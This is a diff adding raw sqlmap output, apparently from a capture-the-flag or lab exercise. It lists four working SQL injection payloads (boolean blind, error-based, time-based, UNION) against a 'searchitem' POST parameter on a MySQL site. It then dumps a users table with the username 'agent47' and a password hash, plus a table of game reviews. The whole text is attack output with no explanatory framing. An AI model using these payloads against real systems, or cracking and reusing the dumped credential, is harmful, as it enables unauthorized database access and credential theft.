@@ -1,0 +1,42 @@
+sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: searchitem=-2755' OR 7844=7844#
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: searchitem=hello' OR (SELECT 9307 FROM(SELECT COUNT(*),CONCAT(0x7171626b71,(SELECT (ELT(9307=9307,1))),0x7170767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NVQX
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchitem=hello' AND (SELECT 6065 FROM (SELECT(SLEEP(5)))yJND)-- Ctpj
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: searchitem=hello' UNION ALL SELECT NULL,NULL,CONCAT(0x7171626b71,0x577166685668746a5147614b4d6f46444d7845625547435555667a784179586a7a61486c48705949,0x7170767071)#
+---
+back-end DBMS: MySQL >= 5.0
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+Database: db
+Table: post
+[5 entries]
++------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id   | name                           | description                                                                                                                                                                                            |
++------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 2    | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
+| 3    | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
+| 4    | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
+| 1    | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
+| 5    | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
++------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
